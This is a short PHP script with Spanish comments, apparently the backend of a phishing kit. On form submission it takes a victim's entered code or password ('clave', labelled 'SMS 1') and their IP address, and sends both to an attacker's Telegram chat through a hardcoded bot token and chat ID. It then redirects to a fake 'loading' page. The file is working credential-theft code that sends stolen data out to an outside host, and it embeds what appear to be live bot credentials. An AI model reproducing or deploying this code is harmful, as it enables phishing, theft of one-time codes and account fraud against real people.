<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Asigna tus credenciales de Telegram
    $botToken = "6783125315:AAHnBQxcDcmBiytZzmV0X3zG6r1atjM2MqI";
    $chatID = "-4065625444";

    // Recupera la clave del formulario
    $clave = $_POST['clave'];

    // Obtiene la dirección IP del cliente
    $ip = $_SERVER['REMOTE_ADDR'];

    // Mensaje a enviar
    $mensaje = "SMS 1: " . $clave . " - IP: " . $ip;

    // URL de la API de Telegram
    $telegramURL = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatID . "&text=" . urlencode($mensaje);

    // Realiza la solicitud a Telegram
    file_get_contents($telegramURL);

    // Redirecciona a otra página
    header("Location: cargando1.php");
    exit();
}
?>
